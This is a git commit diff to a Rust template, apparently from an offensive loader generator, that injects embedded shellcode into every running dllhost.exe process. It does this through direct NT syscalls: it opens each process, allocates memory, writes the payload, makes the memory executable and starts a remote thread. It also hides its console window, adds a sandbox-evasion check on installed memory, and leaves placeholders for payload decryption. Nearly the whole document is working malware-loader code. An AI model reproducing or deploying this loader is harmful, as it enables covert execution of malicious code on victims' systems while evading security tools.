3185c8f283391a0de5bc5bc2fa836c5a6225677e
Nariod <dorian.p@protonmail.ch>
2023-04-23 17:52:31 +0200

    test

--- templates/sysCRT/src/main.rs
+++ templates/sysCRT/src/main.rs
@@ -1,34 +1,46 @@
-//#![windows_subsystem = "windows"]
-// TODO: remove all debug info
+#![windows_subsystem = "windows"]
 
+use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use std::include_bytes;
-use std::{ptr::null_mut};
-use freshycalls_syswhispers::{self, syscall, syscall_resolve::get_process_id_by_name};
-use ntapi::{
-    ntapi_base::CLIENT_ID,
-};
+use rust_syscalls::syscall;
+
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, MEM_RESERVE, GENERIC_ALL},
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
         lmaccess::{ACCESS_ALL}
     },
     shared::{
         ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
     }
 };
-use ntapi::winapi::ctypes::c_void;
-use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
-use std::mem::zeroed;
-use winapi::shared::ntdef::NULL;
-use winapi::um::errhandlingapi::GetLastError;
+use winapi::ctypes::c_void;
+use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+use std::{ptr::null_mut};
+use ntapi::ntapi_base::CLIENT_ID;
+use ntapi::ntpsapi::NtOpenProcess;
+use ntapi::ntmmapi::NtAllocateVirtualMemory;
+use ntapi::ntmmapi::NtWriteVirtualMemory;
+use ntapi::ntmmapi::NtProtectVirtualMemory;
 use ntapi::ntpsapi::NtCreateThreadEx;
+use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
+
 
 {{IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
 
+fn boxboxbox(tar: &str) -> Vec<usize> {
+    // search for processes to inject into
+    let mut dom: Vec<usize> = Vec::new();
+    let s = System::new_all();
+    for pro in s.processes_by_exact_name(tar) {
+        //println!("{} {}", pro.pid(), pro.name());
+        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    }
+    return dom;
+}
 
-fn enhance(mut buf: Vec<u8>, tar:usize) {
+fn enhance(mut buf: Vec<u8>, tar: usize) {
     // injecting in target processes :)
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
@@ -38,102 +50,54 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
     };
 
     unsafe {
-        let open_status = syscall!(
-            "NtOpenProcess",
-            &mut process_handle,
-            ACCESS_ALL,
-            &mut oa,
-            &mut ci
-        );
+
+        //let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
+        let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
         if !NT_SUCCESS(open_status) {
             panic!("Error opening process: {}", open_status);
         }
-
+        //let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let mut allocstart : *mut c_void = null_mut();
         let mut size : usize = buf.len();
-        let alloc_status = syscall!(
-            "NtAllocateVirtualMemory",
-            process_handle,
-            &mut allocstart,
-            0,
-            &mut size, 
-            MEM_COMMIT | MEM_RESERVE, 
-            PAGE_READWRITE
-        );
+        let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(alloc_status) {
             panic!("Error allocating memory to the target process: {}", alloc_status);
         }
-        let mut bytes_written = 0;
+        let mut byteswritten = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
         let mut buffer_length = buf.len();
-
-        let write_status = syscall!(
-            "NtWriteVirtualMemory", 
-            process_handle,
-            allocstart,
-            buffer,
-            buffer_length,
-            &mut bytes_written
-        );
+        let write_status = syscall!("NtWriteVirtualMemory", process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
-            panic!("Error writing shellcode to memory of the target process: {}", write_status);
+            panic!("Error writing to the target process: {}", write_status);
         }
-
-        let mut old_perms = PAGE_READWRITE;
-        let write_status = syscall!(
-            "NtProtectVirtualMemory", 
-            process_handle,
-            &mut allocstart,
-            &mut buffer_length,
-            PAGE_EXECUTE_READWRITE,
-            &mut old_perms
-        );
-        if !NT_SUCCESS(write_status) {
-            panic!("Error changing memory attributes: {}", write_status);
-        }
-
-        let mut thread_handle : *mut c_void = null_mut();
-        let handle = process_handle as *mut c_void;
-        let mut oa = zeroed::<OBJECT_ATTRIBUTES>(); 
-        let mut pa = zeroed::<PS_ATTRIBUTE_LIST>();
-
-        // needs null_mut() on third arg and last:
-        //let write_thread = NtCreateThreadEx(&mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, NULL, 0, 0, 0, 0, &mut pa);
-         
-        let write_thread = syscall!(
-            "NtCreateThreadEx",
-            &mut thread_handle,
-            GENERIC_ALL, 
-            NULL,
-            handle,
-            allocstart,
-            NULL,
-            0, 
-            0, 
-            0, 
-            0, 
-            NULL
-        );
-        
-        /* 
-        let write_thread = syscall!(
-            "NtCreateThreadEx",
-            &mut thread_handle,
-            GENERIC_ALL, 
-            &mut lol1,
-            handle,
-            allocstart, 
-            NULL,
-            0, 
-            0, 
-            0, 
-            0, 
-            &mut lol3
+        /*let _resb = WriteProcessMemory(
+            h_process,
+            result_ptr,
+            buf.as_ptr() as _,
+            buf.len(),
+            Some(&mut byteswritten),
         );
         */
+        let mut old_perms = PAGE_READWRITE;
+        let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
+        if !NT_SUCCESS(protect_status) {
+            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
+        }
+        /* 
+        let _bool = VirtualProtectEx(
+            h_process,
+            result_ptr,
+            buf.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut old_perms,
+        );
+        */
+        let mut thread_handle : *mut c_void = null_mut();
+        let handle = process_handle as *mut c_void;
+        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
+
         if !NT_SUCCESS(write_thread) {
-            let last_error = GetLastError();
-            println!("Last error: {}", last_error);
             panic!("Error failed to create remote thread: {}", write_thread);
         }
     }
@@ -143,16 +107,27 @@ fn main() {
     // inject in the following processes:
     let tar: &str = "dllhost.exe";
 
+    let mut memory = 0;
+    unsafe {
+        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
+        println!("{:#?}", is_quicksand);
+        if is_quicksand != 1 {
+            panic!("Hello.")
+        }
+    }
+
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
     }
-    let process_id = get_process_id_by_name(&tar);
-    if process_id == 0 {
+    let list: Vec<usize> = boxboxbox(tar);
+    if list.len() == 0 {
         panic!("[-] Unable to find a process.")
     } else {
-        {{MAIN}}
-        enhance(vec, process_id);
+        for i in &list {
+            {{MAIN}}
+            enhance(vec.clone(), *i);
+        }
     }
 }
